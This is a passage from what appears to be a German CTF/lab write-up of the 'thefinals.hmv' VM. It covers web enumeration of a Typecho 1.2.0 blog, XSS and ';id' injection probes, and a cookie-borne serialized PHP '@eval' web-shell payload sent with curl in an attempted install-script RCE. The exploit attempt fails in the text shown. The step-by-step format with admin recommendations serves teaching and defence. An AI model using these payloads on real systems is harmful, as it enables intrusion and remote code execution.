+<span class="command">Season 4 brings exciting new content and features to THE FINALS! From the sleek, urban Fortune Stadium map sponsored by HOLTOW, ENGIMO, and ISEUL-T, to three powerful new weapons, there's plenty to dive into.</span>
+
+<span class="command">We’ve also added sponsor contracts, allowing players to sign up with one of our three sponsors for unique rewards, new World Tour ranks, and improved Ranked Cashout Tournaments. Plus, new customization options, loadout slots, and revamped leaderboards ensure a more competitive and personalized experience.</span>
+
+<span class="command">Read about all the changes below, and gear up for the most spectacular season of the gameshow yet!</span>
+<span class="command">Update 3.0.0 | Season 3</span>
+
+    <span class="command">Author:staff Time: 2024-06-13 Category:default category Add a comment</span>
+
+<span class="command">Fame, fortune, and glory. This is where all the contestants gather to reach for stardom. In the World Tour, you’ll compete to climb the ladder from Bronze to Gold and beyond. Season 3 will focus on Cashout Tournaments of 24 players in 2-3 week Tournament cycles. The top five players will be on the front page of the World Tour, so check the leaderboard often!</span>
+
+<span class="command">We’ll kick off the Season with the ENGIMO Open, the first stop on the World Tour. This event features traditional Cashout across three maps, including the new Kyoto 1568 Arena!</span>
+
+<span class="command">The World Tour is your oyster, contestants! How will you open it?</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich untersuchte die Suchfunktion des Blogs unter `/blog/index.php/search/`. Die URL-Struktur (`/blog/index.php/search/4/`) deutete darauf hin, dass der Suchbegriff (`4`) direkt in der URL übergeben wurde. Das Aufrufen dieser URL im Browser zeigte die Blog-Beiträge, die den Suchbegriff enthielten. Dies bestätigte, dass die Suchfunktion aktiv ist und die Ergebnisse auf der Seite anzeigt. Das Überprüfen des Quellcodes (`view-source:`) gab mir die reine HTML-Struktur zurück.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Suchfunktion, die den Suchbegriff direkt in der URL verarbeitet, ist ein potenzieller Angriffspunkt für Web-Schwachstellen wie Cross-Site Scripting (XSS) oder SQL Injection, insbesondere wenn die Eingabe nicht ordnungsgemäß validiert oder saniert wird. Die Ergebnisse auf der Seite zeigten, dass die Suchergebnisse direkt in die Seite eingebettet werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Testen Sie alle Input-Felder einer Webanwendung, insbesondere Suchfelder und URL-Parameter, auf gängige Web-Schwachstellen wie XSS und SQL Injection. Verwenden Sie spezielle Payloads, um die Anfälligkeit zu erkennen.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie strenge Input-Validierung und Sanitization für alle Benutzereingaben. Verwenden Sie Output-Encoding, um die Darstellung von Benutzereingaben im HTML-Code sicher zu gestalten und XSS zu verhindern.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">view-source:http://thefinals.hmv/blog/index.php/search/16/?s=10</span>
+   < <span class="command">title</span> ><span class="password">Posts include the keyword 10 - THE FINALS Update Tracker</span>< <span class="command">/title</span> >
+
+<span class="command">view-source:http://thefinals.hmv/blog/index.php/search/10/?s=12</span>
+   < <span class="command">title</span> ><span class="password">Posts include the keyword 12 - THE FINALS Update Tracker</span>< <span class="command">/title</span> >
+
+<span class="command">view-source:http://thefinals.hmv/blog/index.php/search/16/?s=100</span>
+  < <span class="command">title</span> ><span class="password">Posts include the keyword 100 - THE FINALS Update Tracker</span>< <span class="command">/title</span> >
+
+<span class="command">view-source:http://thefinals.hmv/blog/index.php/search/16/?s=100< script >alert(2);< script ></span>
+ < <span class="command">title</span> ><span class="password">Posts include the keyword script alert2 script - THE FINALS Update Tracker</span>< <span class="command">/title</span> >
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich testete die Suchfunktion weiter auf Cross-Site Scripting (XSS), indem ich versuchte, HTML- und JavaScript-Code in den Suchparameter `s` einzuschleusen. Ich verwendete die URL `http://thefinals.hmv/blog/index.php/search/16/?s=100< script > alert(2);< script >` (wobei der Pfad `16/` irrelevant war, es ging um den `s`-Parameter). Das Ergebnis zeigte, dass der injizierte String `< script > alert(2);< script >` nicht als ausführbares HTML/JavaScript im Titel der Seite erschien, sondern als reiner Text: `Posts include the keyword alert2  - THE FINALS Update Tracker`. Dies deutete darauf hin, dass die Eingabe entweder gefiltert oder maskiert wurde.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Tests zeigten, dass eine einfache XSS-Injektion über den Suchparameter `s` im Titel der Seite nicht direkt möglich war, da der Code nicht ausgeführt wurde. Dies bedeutet, dass der Server eine gewisse Filterung oder Maskierung von HTML-Tags vornimmt, um XSS zu verhindern. Ich musste nach anderen Injektionspunkten oder komplexeren Payloads suchen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn einfache XSS-Payloads blockiert werden, versuchen Sie, die Filterregeln zu umgehen (z.B. durch Variation der Tags, Encoding, Mutation) oder suchen Sie nach XSS in anderen Teilen der Seite (z.B. im Body, in Attributen).
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie robuste Input-Validierung und Output-Encoding, um XSS zu verhindern. Überprüfen Sie die Webanwendung auf XSS-Schwachstellen mit automatisierten Tools und manuellen Tests.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">POST /blog/index.php/archives/16/ HTTP/1.1</span>
+<span class="command">Host: thefinals.hmv</span>
+<span class="command">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span>
+<span class="command">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="command">Accept-Language: de,en-US;q=0.7,en;q=0.3</span>
+<span class="command">Accept-Encoding: gzip, deflate, br</span>
+<span class="command">Content-Type: application/x-www-form-urlencoded</span>
+<span class="command">Content-Length: 9</span>
+<span class="command">Origin: http://thefinals.hmv</span>
+<span class="command">DNT: 1</span>
+<span class="command">Connection: keep-alive</span>
+<span class="command">Referer: http://thefinals.hmv/blog/index.php/archives/16/</span>
+<span class="command">Upgrade-Insecure-Requests: 1</span>
+<span class="command">Sec-GPC: 1</span>
+<span class="command">Priority: u=0, i</span>
+
+<span class="command">s=10%3Bid</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">HTTP/1.1 302 Found</span>
+<span class="password">Date: Thu, 26 Jun 2025 14:47:47 GMT</span>
+<span class="password">Server: Apache/2.4.62 (Unix)</span>
+<span class="password">X-Powered-By: PHP/8.4.5</span>
+<span class="password">Location: http://thefinals.hmv/blog/index.php/search/10+id/</span>
+<span class="command">Content-Length: 0</span>
+<span class="command">Keep-Alive: timeout=5, max=100</span>
+<span class="command">Connection: Keep-Alive</span>
+<span class="command">Content-Type: text/html; charset=UTF-8</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich testete die Suchfunktion auch mit einer POST-Anfrage an die URL `/blog/index.php/archives/16/comment` (obwohl der Pfad `/archives/16/` für die Suchfunktion selbst wahrscheinlich irrelevant war, nutzte ich hier möglicherweise ein Login- oder Kommentarformular auf der Seite 16 als Vehikel). Im POST-Body versuchte ich, den Parameter `s` mit einem SQL Injection Payload zu senden: `s=10%3Bid`. Das `%3Bid` ist die URL-kodierte Form von `;id`, was ich als SQL-Befehlstrennzeichen und einen nachfolgenden `id`-Befehl injizieren wollte. Die Antwort war eine `302 Found` Umleitung auf die URL `http://thefinals.hmv/blog/index.php/search/10+id/`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Umleitung auf `/search/10+id/` zeigte, dass der injizierte `;id` String im URL-Pfad der Umleitung reflektiert wurde. Dies deutet darauf hin, dass die Eingabe im POST-Parameter `s` direkt in die URL kopiert wurde, ohne die Semikolon-Syntax zu interpretieren oder zu filtern. Dies könnte ein Hinweis auf eine Blind SQL Injection oder eine andere Art von Injektion sein, bei der die Ergebnisse indirekt reflektiert werden. Es bestätigte zumindest, dass meine Eingabe verarbeitet wurde.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Testen Sie Webanwendungen auf SQL Injection, insbesondere in Suchfeldern, Login-Formularen oder anderen Eingabepunkten. Achten Sie auf Umleitungen oder Fehlermeldungen, die auf die Verarbeitung Ihrer Payloads hindeuten. Versuchen Sie, die SQL-Version zu identifizieren und spezifische Payloads dafür zu entwickeln.
+                <br><strong>Empfehlung (Admin):</strong> Verwenden Sie Prepared Statements oder parametrisierte Abfragen, um SQL Injection zu verhindern. Validieren und sanieren Sie alle Benutzereingaben, die in Datenbankabfragen verwendet werden.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://thefinals.hmv/js/</span>
+
+<span class="command">Index of /js</span>
+
+    <span class="command">Parent Directory</span>
+<span class="command">    bootstrap.js</span>
+<span class="command">    jquery-1.10.2.min.js</span>
+<span class="command">    jquery-migrate-1.2.1.min.js</span>
+<span class="command">    jquery.lightbox.js</span>
+<span class="command">    modernizr.js</span>
+<span class="command">    tabs.js</span>
+<span class="command">    templatemo_custom.js</span>
+
+<span class="command">Apache/2.4.62 (Unix) Server at thefinals.hmv Port 80</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Wie von Nikto und Feroxbuster gemeldet, wies das Verzeichnis `/js/` auf Port 80 Verzeichnislistung auf. Ich rief die URL `http://thefinals.hmv/js/` im Browser auf und erhielt eine Liste der im Verzeichnis enthaltenen JavaScript-Dateien. Darunter waren Standardbibliotheken wie `bootstrap.js`, `jquery-1.10.2.min.js` sowie spezifische Dateien wie `templatemo_custom.js`, `tabs.js` und `jquery.lightbox.js`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Verzeichnislistung im `/js/` Verzeichnis war eine offene Informationsquelle. Obwohl die gefundenen JavaScript-Dateien Standard-Webfunktionen zu unterstützen schienen und wahrscheinlich keine direkten Schwachstellen enthielten, erlaubte mir die Listung, ihre Existenz zu bestätigen und sie bei Bedarf herunterzuladen und zu analysieren. Dies ist eine Fehlkonfiguration, die dem Angreifer bei der Web-Enumeration hilft.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie Verzeichnislistungen, um alle Dateien in einem Verzeichnis zu identifizieren. Laden Sie alle relevanten Dateien herunter und analysieren Sie sie auf Zugangsdaten, Kommentare oder Hinweise auf die Webanwendung.
+                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie die Verzeichnislistung. Ersetzen Sie sie durch eine Standard-Indexdatei oder einen 403-Fehler.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">wappalyzer</span>
+
+<span class="command">Technologies</span>
+<span class="command">More info</span>
+<span class="command">Export</span>
+<span class="command">Blog</span>
+<span class="password">Typecho 1.2.0</span>
+<span class="command">Schrift Script</span>
+<span class="command">Font Awesome</span>
+<span class="command">Google Font API</span>
+<span class="command">Web Server</span>
+<span class="password">Apache HTTP Server 2.4.62</span>
+<span class="command">Programmiersprache</span>
+<span class="password">PHP 8.4.5</span>
+<span class="command">Betriebssysteme</span>
+<span class="command">UNIX</span>
+<span class="command">JavaScript Bibliotheken</span>
+<span class="password">jQuery 1.10.2</span>
+<span class="password">jQuery Migrate 1.2.1</span>
+<span class="password">Modernizr 2.0.6</span>
+<span class="command">UI Frameworks</span>
+<span class="command">Bootstrap</span>
+<span class="command">Something wrong or missing?</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Um die auf der Webseite verwendeten Technologien schnell zu identifizieren, setzte ich das Browser-Plugin Wappalyzer ein. Wappalyzer analysiert eine Webseite und erkennt die darauf laufenden Technologien. Die Ausgabe bestätigte, dass es sich um einen Blog auf Basis von Typecho Version 1.2.0 handelt. Es identifizierte auch den Webserver (Apache 2.4.62), die PHP-Version (8.4.5), das Betriebssystem (UNIX), verwendete JavaScript-Bibliotheken (jQuery, Modernizr) und Frameworks (Bootstrap).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Wappalyzer lieferte eine umfassende und bestätigende Übersicht der verwendeten Technologien. Die genaue Version von Typecho (1.2.0) ist entscheidend für die gezielte Suche nach Schwachstellen. Die PHP-Version 8.4.5 ist relativ aktuell, aber auch hier könnten versionsspezifische Schwachstellen existieren. Die anderen identifizierten Technologien sind Standard und bieten wahrscheinlich keine sofortigen Schwachstellen, bestätigen aber das Umfeld.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie passive oder aktive Tools wie Wappalyzer, BuiltWith oder WhatWeb, um verwendete Technologien und deren Versionen zu identifizieren. Diese Informationen sind Gold wert für die Suche nach bekannten Schwachstellen.
+                <br><strong>Empfehlung (Admin):</strong> Entfernen Sie alle nicht benötigten Technologie-Hinweise (z.B. `X-Powered-By` Header, Generator-Metatags). Halten Sie alle Komponenten Ihrer Webanwendung (CMS, Frameworks, Bibliotheken, PHP) auf dem neuesten Stand und gepatcht.
+
+             </p>        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://thefinals.hmv/screenshots/</span>
+
+<span class="command">Index of /screenshots</span>
+
+    <span class="command">Parent Directory</span>
+<span class="password">    1750942322.png</span>
+<span class="password">    1750942381.png</span>
+<span class="password">    1750942441.png</span>
+<span class="password">    1750942501.png</span>
+<span class="password">    1750942562.png</span>
+<span class="password">    1750942622.png</span>
+<span class="password">    1750942742.png</span>
+<span class="password">    1750942802.png</span>
+<span class="password">    1750942862.png</span>
+<span class="password">    1750942922.png</span>
+<span class="password">    1750942982.png</span>
+<span class="command">....</span>
+<span class="command">...</span>
+<span class="command">..</span>
+<span class="password">    1750968781.png</span>
+<span class="password">    1750968841.png</span>
+<span class="password">    1750968901.png</span>
+<span class="password">    1750968961.png</span>
+<span class="password">    1750969021.png</span>
+<span class="password">    1750969081.png</span>
+<span class="password">    1750969141.png</span>
+
+<span class="command">Apache/2.4.62 (Unix) Server at thefinals.hmv Port 80</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Eine der von Nikto und Feroxbuster gemeldeten Verzeichnislistungen war das `/screenshots/` Verzeichnis. 
+Ich rief `http://thefinals.hmv/screenshots/` in meinem Browser auf. Die Seite zeigte eine Liste von Dateien mit numerischen Namen und der Endung 
+`.png` (z.B. `1750942322.png`). Dies deutete auf eine Sammlung von Screenshots hin, möglicherweise von früheren Durchläufen der VM oder von Entwicklungs-/Testaktivitäten. Die schiere
+ Anzahl der Dateien war auffällig.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Eine Verzeichnislistung in einem Verzeichnis, das potenziell sensible Daten wie Screenshots enthält, ist eine signifikante Schwachstelle. 
+Screenshots können Passwörter, interne Informationen, Fehlermeldungen oder Hinweise auf andere Schwachstellen enthalten. Das Herunterladen und Überprüfen dieser Dateien war ein logischer nächster Schritt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie Verzeichnisse mit Verzeichnislistung immer auf potenziell sensible Dateien (Screenshots, Backups, 
+Konfigurationsdateien, Logdateien). Automatisieren Sie das Herunterladen, wenn viele Dateien vorhanden sind.
+                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie die Verzeichnislistung. Speichern Sie niemals sensible Daten in öffentlich zugänglichen Webverzeichnissen. 
+Wenn Sie Dateien im Web-Root ablegen müssen, beschränken Sie den Zugriff darauf strikt.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/finals]
+└─# <span class="command">for i in $(cat png.txt); do wget http://thefinals.hmv/screenshots/$i; done</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/finals]
+└─# <span class="command">ll | grep -v 31556</span></div>
+                    <pre><span class="command">insgesamt 14316</span>
+<span class="command">-rw-r--r-- 1 root root 31554 26. Jun 14:59 1750942742.png</span>
+<span class="command">-rw-r--r-- 1 root root 31554 26. Jun 16:31 1750948262.png</span>
+<span class="command">-rw-r--r-- 1 root root 31554 26. Jun 19:04 1750957442.png</span>
+<span class="command">-rw-r--r-- 1 root root  8474 26. Jun 22:22 png.txt</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Um die zahlreichen Screenshots effizient herunterzuladen, erstellte ich eine Datei (`png.txt`, hier nicht gezeigt) mit den Dateinamen aller 
+PNG-Dateien aus der Verzeichnislistung. Dann nutzte ich eine einfache Bash-Schleife, um jede Datei herunterzuladen. Der Befehl `for i in $(cat png.txt); do wget http://thefinals.hmv/screenshots/$i; 
+done` las jeden Dateinamen aus `png.txt` und führte für jeden Namen einen `wget`-Befehl aus, um die entsprechende Datei herunterzuladen. Nach dem Download listete ich die heruntergeladenen Dateien mit
+ `ll` (ein Alias für `ls -lha`) auf und filterte die Ausgabe mit `grep -v 31556` (zeige Zeilen, die NICHT die Größe 31556 enthalten). Die Ausgabe zeigte einige heruntergeladene PNG-Dateien und die Datei
+ `png.txt` selbst. Das `grep -v 31556` deutete darauf hin, dass möglicherweise die meisten Dateien diese Größe hatten und ich mich auf ungewöhnlich große oder kleine Dateien konzentrierte oder um eine 
+unnötige Ausgabe zu reduzieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das automatisierte Herunterladen der Screenshots war erfolgreich. Die Tatsache, dass einige Dateien dieselbe Größe hatten (31554 Bytes, 
+basierend auf der grep-Ausgabe), deutete darauf hin, dass es sich um ähnlichen Inhalt handeln könnte. Die ungewöhnlich großen oder kleinen Dateien oder eine manuelle Analyse der
+ Bilder konnten potenziell sensible Informationen offenbaren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Automatisieren Sie das Herunterladen von Dateien aus Verzeichnissen mit Verzeichnislistung. Verwenden Sie Filter oder Skripte, 
+um große Mengen von Dateien effizient zu verarbeiten und zu analysieren. Überprüfen Sie Metadaten oder Dateigrößen auf Anomalien. Analysieren Sie die heruntergeladenen Bilder sorgfältig.
+                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie die Verzeichnislistung. Verhindern Sie das Speichern von sensiblen Daten in öffentlich zugänglichen Verzeichnissen,
+ auch wenn es sich nur um temporäre Dateien handelt.
+            </p>
+
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">POST /blog/index.php/action/login?_=fb224b07b183de58b98104e8ccbf37ce HTTP/1.1</span>
+<span class="command">Host: thefinals.hmv</span>
+<span class="command">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span>
+<span class="command">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="command">Accept-Language: de,en-US;q=0.7,en;q=0.3</span>
+<span class="command">Accept-Encoding: gzip, deflate, br</span>
+<span class="command">Content-Type: application/x-www-form-urlencoded</span>
+<span class="command">Content-Length: 80</span>
+<span class="command">Origin: http://thefinals.hmv</span>
+<span class="command">DNT: 1</span>
+<span class="command">Connection: keep-alive</span>
+<span class="command">Referer: http://thefinals.hmv/blog/admin/login.php?referer=http%3A%2F%2Fthefinals.hmv%2Fblog%2Fadmin%2F</span>
+<span class="command">Upgrade-Insecure-Requests: 1</span>
+<span class="command">Sec-GPC: 1</span>
+<span class="command">Priority: u=0, i</span>
+
+<span class="command">name=admisss&password=sssss&referer=http%3A%2F%2Fthefinals.hmv%2Fblog%2Fadmin%2F</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">HTTP/1.1 302 Found</span>
+<span class="password">Date: Thu, 26 Jun 2025 15:08:14 GMT</span>
+<span class="password">Server: Apache/2.4.62 (Unix)</span>
+<span class="password">X-Powered-By: PHP/8.4.5</span>
+<span class="password">Location: http://thefinals.hmv/blog/admin/login.php?referer=http%3A%2F%2Fthefinals.hmv%2Fblog%2Fadmin%2F</span>
+<span class="command">Set-Cookie: 7d07d00c3730d08dbac222ccaf73fd49__typecho_remember_name=admisss; path=/blog/</span>
+<span class="password">Set-Cookie: 7d07d00c3730d08dbac222ccaf73fd49__typecho_notice=%5B%22Username%20or%20password%20is%20invalid.%22%5D; path=/blog/</span>
+<span class="password">Set-Cookie: 7d07d00c3730d08dbac222ccaf73fd49__typecho_notice_type=error; path=/blog/</span>
+<span class="command">Content-Length: 0</span>
+<span class="command">Keep-Alive: timeout=5, max=100</span>
+<span class="command">Connection: Keep-Alive</span>
+<span class="command">Content-Type: text/html; charset=UTF-8</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Da die Feroxbuster-Ausgabe einen Admin-Bereich (`/blog/admin/`) und eine Login-Seite (`login.php`) zeigte, versuchte ich, mich am Typecho-Blog anzumelden. 
+Ich sendete eine POST-Anfrage an den Login-Endpunkt (`/blog/index.php/action/login`). Der POST-Body enthielt typische Login-Felder (`name`, `password`) mit Testwerten (`admisss`, `sssss`). Die Antwort
+ war eine `302 Found` Umleitung zurück zur Login-Seite, zusammen mit Set-Cookie-Headern, die eine Fehlermeldung enthielten: `"Username or password is invalid."`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Login-Versuch schlug fehl, was zu erwarten war, da ich keine korrekten Zugangsdaten hatte. Die Fehlermeldung bestätigte jedoch, dass der Login-Mechanismus 
+funktioniert und dass die Parameter `name` und `password` korrekt verarbeitet wurden. Dies war ein Standard-Schritt, um die Existenz der Login-Funktionalität zu bestätigen. Das Identifizieren des CMS 
+(Typecho 1.2.0) war jedoch viel wichtiger als das Brute-Forcen des Logins.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Sie einen Login-Bereich finden und keine Zugangsdaten haben, versuchen Sie, die zugrundeliegende Software zu identifizieren und nach 
+versionsspezifischen Exploits (z.B. Authentifizierungs-Bypässe, Schwachstellen, die keinen Login erfordern) zu suchen, bevor Sie mit Brute-Force-Angriffen beginnen.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie Brute-Force-Schutzmechanismen auf Login-Seiten (z.B. Rate Limiting, Account-Sperrung nach mehreren Fehlversuchen,
+ Captchas). Verwenden Sie starke, eindeutige Passwörter.
+
+             </p>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Da ich wusste, dass die VM Typecho Version 1.2.0 hostet und die Installation über den `/blog/install/` Pfad erreichbar zu sein schien (Feroxbuster
+ fand dieses Verzeichnis und meldete Verzeichnislistung), recherchierte ich gezielt nach Exploits für Typecho 1.2.0. Ich fand Informationen über einen bekannten Remote Code Execution (RCE)
+ Exploit für Typecho 1.2.0, der während des Installationsprozesses ausgenutzt werden kann, wenn die Installation nicht abgeschlossen oder zurückgesetzt wurde. Dieser Exploit basiert darauf, 
+dass ein Cookie mit einem manipulierten Base64-kodierten String gesetzt wird, der schädlichen PHP-Code enthält, der dann während des Installationsschritts verarbeitet wird.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Auffinden eines veröffentlichten RCE-Exploits für die identifizierte Typecho-Version ist ein kritischer Schritt zum Initial Access. Der Exploit, 
+der die Installation ausnutzt, ist sehr vielversprechend, da Testsysteme oft in einem Zustand belassen werden, der die Installation ermöglicht. Das Verzeichnis `/blog/install/` existierte und 
+war zugänglich, was die Wahrscheinlichkeit erhöhte, dass dieser Exploit funktionieren würde.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Sie eine Anwendung und deren Version identifiziert haben, suchen Sie auf Plattformen wie Exploit-DB, GitHub oder einschlägigen S
+ecurity-Blogs nach bekannten Exploits. Achten Sie auf Exploits, die keinen Authentifizierung erfordern.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Installationen von CMS- oder Webanwendungen vollständig abgeschlossen und das Installationsverzeichnis 
+anschließend entfernt oder der Zugriff darauf gesperrt wird. Halten Sie alle Webanwendungen und deren Komponenten auf dem neuesten Stand, um bekannte Schwachstellen zu schließen.
+
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">PAYLOAD=$(echo -n 'a:1:{s:6:"prefix";s:35:"@eval($POST[\"cmd\"]);";}' | base64)</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich bereitete den Payload für den Typecho RCE Exploit vor. Gemäß der Exploit-Dokumentation musste ein spezifisch formatierter String Base64-kodiert
+ und in einem Cookie (`typecho_config`) übergeben werden. Der String, den ich kodierte, war `a:1:{s:6:"prefix";s:35:"@eval($POST[\"cmd\"]);";}`. Dieser String ist ein serialisiertes PHP-Array, 
+das ein `prefix`-Element enthält, dessen Wert schädlichen PHP-Code `@eval($POST["cmd"]);` ist. Dieser Code erstellt eine einfache Web-Shell, die beliebige Systembefehle ausführt, die über den
+ `cmd` Parameter einer POST-Anfrage übergeben werden. Ich kodierte diesen String mit Base64 (`echo -n '...' | base64`) und speicherte das Ergebnis in der Variable `PAYLOAD`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Vorbereitung des serialisierten und Base64-kodierten Payloads war entscheidend für die Ausnutzung des Typecho-Exploits. Der injizierte
+ PHP-Code (`@eval($POST["cmd"]);`) ist eine sehr effektive Web-Shell, die eine direkte Befehlsausführung über HTTP ermöglicht. Das `@` vor `eval` unterdrückt Fehlermeldungen auf der Webseite, 
+was den Exploit unauffälliger macht.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn ein Exploit die Injektion von serialisierten oder kodierten Daten erfordert, stellen Sie sicher, dass Sie das korrekte Format 
+und die korrekte Kodierung verwenden. Erstellen Sie Payloads, die eine einfache Befehlsausführung ermöglichen (z.B. eine simple Web-Shell).
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie ungewöhnliche Cookie-Werte, insbesondere solche, die Base64-kodierten oder serialisierten Inhalt enthalten. Implementieren Sie 
+Input-Validierung und Deserialisierungs-Schutzmechanismen. Verwenden Sie keine `eval()` oder ähnliche Funktionen mit Benutzereingaben.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X POST http://thefinals.hmv/blog/install.php \ -d 'finish=&host=localhost&user=r&password=p&dbname=d&db_prefix=typecho_&adapter=Pdo_Mysql' \
+ --cookie "typecho_config=$PAYLOAD"</span></div>
+                    <pre><span class="command"> 400 Bad Request</span>
+<span class="command"><h1>Bad Request</h1></span>
+<span class="command"><p>Your browser sent a request that this server could not understand.<br /></span>
+<span class="command"></p></span>
+<span class="command"><hr></span>
+<span class="command"><address>Apache/2.4.62 (Unix) Server at thefinals.hmv Port 80</address></span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich versuchte, den Typecho RCE Exploit auszuführen, indem ich eine POST-Anfrage an die Installationsseite `/blog/install.php` sendete. Ich verwendete
+ `curl` mit der Methode `POST` (`-X POST`), richtete sie an die URL `http://thefinals.hmv/blog/install.php` und fügte im POST-Body (`-d '...'`) einige Dummy-Installationsparameter hinzu. 
+Entscheidend war das Setzen des Cookies (`--cookie "typecho_config=$PAYLOAD"`) mit dem zuvor generierten schädlichen Base64-Payload. Die Antwort war jedoch ein `400 Bad Request` Fehler.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Exploit-Versuch schlug fehl und führte zu einem "Bad Request". Dies deutet darauf hin, dass entweder die URL (`install.php`) oder die gesendeten 
+POST-Parameter nicht korrekt waren, oder dass der Server den manipulierten Cookie erkannte und blockierte. Es war notwendig, die genaue Struktur des Installations-Requests zu überprüfen.
+ Ich musste einen Weg finden, den Installationsprozess so anzustoßen, dass mein Cookie verarbeitet wird.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn ein veröffentlichter Exploit fehlschlägt, überprüfen Sie die Voraussetzungen, die genauen Parameter und die URL. Manchmal sind kleine 
+Anpassungen oder das Verständnis des zugrundeliegenden Prozesses erforderlich. Führen Sie die Schritte des Exploits manuell durch, um zu verstehen, was schief geht.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Anfragen an Installationsskripte auf Produktionssystemen. Blockieren Sie den Zugriff auf Installationsverzeichnisse oder 
+-dateien vollständig, nachdem die Installation abgeschlossen ist. Implementieren Sie Signaturen in einer WAF, um bekannte Exploit-Payloads zu erkennen.
+
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">feroxbuster --url "http://thefinals.hmv/blog/install/" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml</span></div>
+                    <pre><span class="command"> ___  ___  __   __     __      __         __   ___</span>
+<span class="command">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span>
+<span class="command">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span>
+<span class="command">by Ben "epi" Risher 🤓                 ver: 2.11.0</span>
+<span class="command">───────────────────────────┬──────────────────────</span>
+<span class="command"> 🎯  Target Url            │ http://thefinals.hmv/blog/install/</span>
